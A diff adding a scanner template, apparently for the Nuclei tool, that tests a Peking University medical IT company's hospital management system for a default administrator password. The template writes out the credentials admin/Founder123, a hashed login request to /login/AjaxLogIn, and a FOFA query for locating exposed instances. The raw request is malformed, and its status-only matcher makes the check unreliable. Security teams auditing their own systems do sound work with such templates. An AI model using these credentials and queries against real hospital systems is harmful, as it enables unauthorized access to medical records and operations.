@@ -1,0 +1,32 @@
+id: poc-cnxnq9qnbnvp5xit
+info:
+  name: 北大医疗信息技术有限公司运营管理与决策支持系统AjaxLogIn存在弱口令漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cnxnq9qnbnvp5xit'
+  tags: default-login,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cnxnq9qnbnvp5xit
+    fofa: body="/hospital/beijing/BeiDaYiXin/login/iconfont/style.css"
+http:
+- raw:
+  - 'admin/Founder123
+
+    POST /login/AjaxLogIn HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.1943.105 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 45
+
+
+    username=admin&password=35158adeafe2b02a17f2a42e9a88cc02'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
